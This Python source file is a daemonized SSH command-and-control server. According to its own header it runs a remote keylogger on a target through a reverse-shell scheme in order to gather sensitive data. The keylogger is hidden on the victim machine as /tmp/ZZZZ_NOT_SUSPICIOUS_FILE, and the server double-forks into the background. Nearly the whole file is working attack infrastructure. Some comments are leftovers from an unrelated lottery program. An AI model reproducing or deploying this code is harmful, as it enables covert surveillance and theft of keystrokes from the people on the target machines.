#!/usr/bin/python3

# ==============================================================================
#      File: SSH Daemon
#
#      Authors: Sang Min Park, Jacky Tea
#      Libraries Used: paramiko, socket, os, time, logzero,
#      threading, subprocess, sys, atexit, signal, json
#
#      To compile with python3 >>> python3 sshDaemon.py -status start
#      To compile with executable >>> chmod 700 sshDaemon.py
#                                 >>> ./sshDaemon.py -status start
#
#
# -----------------------------------------------------------------------------
#
#      Cookbook code utilized from the following source:
#      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
#
#      Description: A daemonized SSH server that runs in the background and sends commands
#      for an awaiting client over SSH to execute via a reverse-shell scheme.
#
#      Input:  A command line argument of either '-status start' or '-status stop'. For example:
#      ./sshDaemon.py -status start. '-status start' will execute the key logger, ' -status stop'
#      will kill its background process.
#
#      Output: A file called in 'sshDaemon.log' in the current directory containing
#      error messages and information such as received messages over the SSH connection.
#      A file called ZZZZ_NOT_SUSPICIOUS_FILE is generated in /tmp which holds the keylogger
#      program. A file called '/tmp/sshDaemon.pid' is generated to keep track of
#      the running process.
#
#      Algorithm: Once a status is received, the daemon checks if there is the existence
#      of a pid file to see if the daemon instance is already running. If there is one, an
#      error is thrown, else the daemonization process of double forking and flushing stdin,
#      stdout, stderr and keeping track of the current pid before terminal control is relinquished
#      is done. Command are sent via SSH in the background to a SSH client to execute and gather
#      sensitive data from the target end.
#
#      Required Features Not Included:
#
#      Known Bugs:
#
# ==============================================================================

import os
import errno
import signal
import socket
import time
import json
import sshServer
import argparse
import sys
import atexit
import logzero
import paramiko
from logzero import logger

# Maximum queue size for the server to handle incoming client
requestQueueSize = 1024
# Pathway of pidfile that will contain the pid of double-forked daemon
pidfile = "/tmp/daemonServer.pid"
# host key for an SSH connection
host_key = paramiko.RSAKey(filename="test_rsa.key")
# Sleep time (seconds) for daemon server
sleepTime = 24


def grimReaper(signum,  frame):
    """Harvests child processes that have sent a signal. Ensures no zombies"""
    while True:
        try:
            # Wait for any child process, do not block and return EWOULDBLOCK error
            pid,  status = os.waitpid(-1,  os.WNOHANG)
        except OSError:
            return
        # To ensure no zombies
        if pid == 0:
            return
    print('Child {pid} terminated with status {status}'.format(
        pid=pid,  status=status))


def parseCmdArgument():
    """Creating a parser to parse the command line arguments"""
    parser = argparse.ArgumentParser(description='CLI inputs to create server socket',
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter,)

    # argument for the type of lottery wanted by the user
    parser.add_argument('-port',
                        help="""port number for socket""",
                        type=int, default=9000
                        )
    # argument for the amount of lottery tickets
    parser.add_argument('-ip', type=str,
                        help="IPv6 address (e.g. ::1)",
                        default="::1")

    # argument for execution status of the server
    parser.add_argument('-status', type=str,
                        help="start (execute server program) | stop (kill server)",
                        required=True)
                            # argument for execution status of the server
    parser.add_argument('-sleep', type=int,
                        help="time to put daemon to sleep before stopping remote keylogger",
                        default=24)
    # return the parsed command line arguments
    return parser.parse_args()


def removePidProcess():
    """Removes pid process stored in the designated pidfile"""
    if os.path.exists(pidfile):
        logger.info("Server process killed...\n")
        with open(pidfile) as file:
            pid = int(file.readline().rstrip())
            os.kill(pid, signal.SIGTERM)
    else:
        logger.error("Expected server pidfile not found")


def generateAddress(commandArgs):
    """Generate address for the server socket"""
    # Return a tuple of IPv6 address and a port number to be used
    # to create a server socket
    return commandArgs.ip, commandArgs.port


def createSocket():
    """Creating a server socket"""
    try:
        serverSocket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        return serverSocket
    except socket.error as e:
        logger.error(f"Error creating a socket: {e}")
        exit()


def bindSocket(serverSocket, address):
    """Binding socket and listening for oncoming connection"""
    try:
        # Binding socket to address
        serverSocket.bind(address)
        # Listening to oncoming connection
        serverSocket.listen(requestQueueSize)
    except socket.error as e:
        logger.error(f"Error binding socket: {e}")
        serverSocket.close()
        exit()


def dropPrivileges(uid=65534, gid=65534):
    """Drops UID and GID privileges if current process has access to root.
    98 is used to set new UID and GID.
    UIDs 1 through 99 are traditionally reserved for special system users (pseudo-users),
    such as wheel, daemon, lp, operator, news, mail, etc.
    Reference: http://www.linfo.org/uid.html"""
    try:
        # If process has access to root ...
        if os.getuid() == 0:
            logger.info("Dropping root access privileges")
        # Setting new UID and GID
            try:
                os.setuid(uid)
            except OSError as e:
                logger.error(f"'Could not set effective user id: {e}")

            try:
                os.setgid(gid)
            except OSError as e:
                logger.error(f"'Could not set effective group id: {e}")
        else:
            # Process has no root access
            logger.info("No root privileges")
    except Exception as e:
        logger.error("Failed to drop privileges: {e}")
        raise Exception(e)


def daemonize(pidfile, *, stdin='/dev/null',
              stdout='/dev/null',
              stderr='/dev/null'):
    """The code below is adapted by:
    https://github.com/dabeaz/python-cookbook/blob/master/
    src/12/launching_a_daemon_process_on_unix/daemon.py
    It uses Unix double-fork magic based on Stevens's book
    "Advanced Programming in the UNIX Environment".
    Creates a daemon that is diassociated with the terminal
    and has no root privileges. Once double-forking is successful
    it writes its pid to a designated pidfile. The pidfile
    is later used to kill the daemon.
    """

    # If pidfile exists, there is a server program that is currently running
    if os.path.exists(pidfile):
        raise RuntimeError('Already running')

    # First fork (detaches from parent)
    try:
        if os.fork() > 0:
            # Parent exit
            raise SystemExit(0)
    except OSError as e:
        raise RuntimeError(f'fork #1 failed: {e}')

    # Decouple from parent environment
    os.chdir('/tmp')
    os.umask(0)
    os.setsid()
    dropPrivileges()

    logger.info("fork#1 successfull")
    # Second fork (relinquish session leadership)
    try:
        if os.fork() > 0:
            raise SystemExit(0)
    except OSError as e:
        raise RuntimeError(f'fork #2 failed: {e}')

    # Flush I/O buffers
    sys.stdout.flush()
    sys.stderr.flush()

    # Replace file descriptors for stdin, stdout, and stderr
    with open(stdin, 'rb', 0) as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(stdout, 'ab', 0) as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open(stderr, 'ab', 0) as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

    # PID of the double-forked daemon
    fork2DaemonPID = os.getpid()

    # Write the PID file
    with open(pidfile, 'w') as f:
        print(fork2DaemonPID, file=f)

    logger.info(f"fork#2 successful pid[{fork2DaemonPID}]")

    # Arrange to have the PID file removed on exit/signal
    atexit.register(lambda: os.remove(pidfile))
    atexit.register(lambda: removePidProcess())

    # Signal handler for termination (required)
    def sigterm_handler(signo, frame):
        raise SystemExit(1)

    signal.signal(signal.SIGTERM, sigterm_handler)


def createSSHServer(connectionServerSocket):
    # Creating SSH Server
    logger.info("Creating SSH Server")
    sshSocket = paramiko.Transport(connectionServerSocket)

    sshSocket.add_server_key(host_key)
    server = sshServer.SSHServer()

    try:
        logger.info("Starting SSH Server")
        sshSocket.start_server(server=server)
    except paramiko.SSHException:
        print("*** SSH negotiation failed.")
        sys.exit(1)

    logger.info("Connecting SSH Server")
    sshChannel = sshSocket.accept(1)

    if sshChannel is None:
        print("*** No channel.")
        sys.exit(1)
    logger.info("****** Authenticated! ******")
    return sshChannel


def startRemoteKeylogger(sshChannel):
    # command chain
    logger.info(
        "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
    sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
    RXmessage = sshChannel.recv(1024).decode()
    logger.info(f"Received SSH message: {RXmessage}")


def stopRemoteKeylogger(sshChannel):
    time.sleep(sleepTime)
    logger.info(
        "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
    sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
    RXmessage = sshChannel.recv(1024).decode()
    logger.info(f"Received SSH message: {RXmessage}")


def sendCurrentPath(sshChannel, pathDirectory):
    # command chain
    logger.info(
        "Sending path directory")
    sshChannel.send(pathDirectory.encode())
    RXmessage = sshChannel.recv(1024).decode()
    logger.info(f"Received SSH message: {RXmessage}")


def serverForever(commandArgs, pathDirectory):
    """Main function that will execute forever until os kills the process.
    Parent process will listen to all possible incoming clients.
    Once connection has been established parent will fork a child per connection.
    Parent will close the connection socket and loop back to the beginning.
    Child processes will always close the listening socket and handle request from client."""

    # Generate address to be used for the server socket
    address = generateAddress(commandArgs)
    # Create listening server socket
    listeningServerSocket = createSocket()
    # Securing possible socket hijacking
    listeningServerSocket.setsockopt(
        socket.SOL_SOCKET,  socket.SO_REUSEPORT,  1)

    # Bind server socket to listen for oncoming connection
    bindSocket(listeningServerSocket, address)

    logger.info('Server HTTP on port {address} ...'.format(address=address))

    # event handler - when child dies, returns the signal SIGCHILD,
    # grim_reaper then cleans it up to prevent zombies
    signal.signal(signal.SIGCHLD,  grimReaper)

    while True:
        try:
            logger.info("Waiting for connection")
            # Accept incoming connection from client
            connectionServerSocket,  clientAddress = listeningServerSocket.accept()

        except IOError as e:
            errorCode,  errorMssg = e.args
            # restart 'accept' if it was interrupted
            if errorCode == errno.EINTR:
                continue
            else:
                raise

        pid = os.fork()
        # Separate child from its parent
        if pid == 0:
            logger.info(
                f"fork#3 successful [{os.getpid()}]: handling client{clientAddress} requests")
            # Only child daemon will execute from this point on
            # Closing listening socket for childeren
            listeningServerSocket.close()

            sshChannel = createSSHServer(connectionServerSocket)

            RXmessage = sshChannel.recv(1024).decode()

            if RXmessage == "start":
                startRemoteKeylogger(sshChannel)
            elif RXmessage == "stop":
                stopRemoteKeylogger(sshChannel)
            elif RXmessage == "path":
                sendCurrentPath(sshChannel, currentPath)

            # Once task is completed close connection socket
            logger.info("Closing connections. . .")
            sshChannel.close()
            connectionServerSocket.close()
            # Children  exits here
            os._exit(0)
        else:
            # Parent resumes code here after forking
            # Close parent's copy of connection server and loop over to continue to listen
            # for incoming connection
            connectionServerSocket.close()


if __name__ == '__main__':
    # Parse command line arguments
    commandArgs = parseCmdArgument()
    sleepTime = commandArgs.sleep

    # Add logging to logfile and disable output to the terminal
    logzero.logfile("sshDaemon.log", maxBytes=1e6,
                    backupCount=3, disableStderrLogger=True)

    # Start server process
    if commandArgs.status == "start":
        logger.info("Server process starting...")
        try:
            currentPath = os.path.dirname(os.path.abspath(__file__))
            # Start daemonizing process
            daemonize(pidfile, stdout='/tmp/daemonServer.pid',
                      stderr='/tmp/daemonServer.pid')
            # Run server process to handle client connections
            serverForever(commandArgs, currentPath)
        except RuntimeError as e:
            print(e, file=sys.stderr)
            logger.error(e)
            raise SystemExit(1)
    # Kill server process
    elif commandArgs.status == "stop":
        # Kill the process id that is located in the pidfile
        if os.path.exists(pidfile):
            logger.info("Server process killed...\n")
            with open(pidfile) as file:
                pid = int(file.readline().rstrip())
                os.kill(pid, signal.SIGTERM)
        else:
            print("Expected server pidfile not found", file=sys.stderr)
            logger.error("Expected server pidfile not found")
            raise SystemExit(1)
    else:
        print("Wrong status command", file=sys.stderr)
        logger.error("Wrong status command")
        raise SystemExit(1)
